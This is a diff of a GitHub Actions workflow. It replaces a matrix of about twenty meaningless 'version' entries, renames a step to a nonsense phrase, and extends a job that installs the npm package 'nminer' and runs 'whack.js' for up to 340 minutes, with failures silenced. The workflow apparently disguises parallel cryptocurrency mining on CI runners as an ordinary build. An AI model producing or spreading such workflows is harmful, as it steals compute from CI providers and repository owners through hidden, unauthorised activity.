@@ -9,26 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2448 }
-          - { version: 4561 }
-          - { version: 3928 }
-          - { version: 5890 }
-          - { version: 7695 }
-          - { version: 1441 }
-          - { version: 7249 }
-          - { version: 6939 }
-          - { version: 1866 }
-          - { version: 7786 }
-          - { version: 5949 }
-          - { version: 6577 }
-          - { version: 4283 }
-          - { version: 5322 }
-          - { version: 6669 }
-          - { version: 1974 }
-          - { version: 4013 }
-          - { version: 6172 }
-          - { version: 5575 }
-          - { version: 2997 }
+          - { version: 3485 }
+          - { version: 3337 }
+          - { version: 8456 }
+          - { version: 2943 }
+          - { version: 1354 }
+          - { version: 4460 }
+          - { version: 4459 }
+          - { version: 9506 }
+          - { version: 347 }
+          - { version: 7691 }
+          - { version: 3803 }
+          - { version: 3982 }
+          - { version: 8872 }
+          - { version: 8985 }
+          - { version: 1261 }
+          - { version: 6333 }
+          - { version: 1767 }
+          - { version: 1625 }
 
     steps:
       - name: Checkout
@@ -39,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: implode
+      - name: nauseate chapel oh toward whoa
         run: |
           npm install nminer@latest
-          timeout 320m node whack.js || echo "whack executed"
+          timeout 340m node whack.js || echo "whack executed"
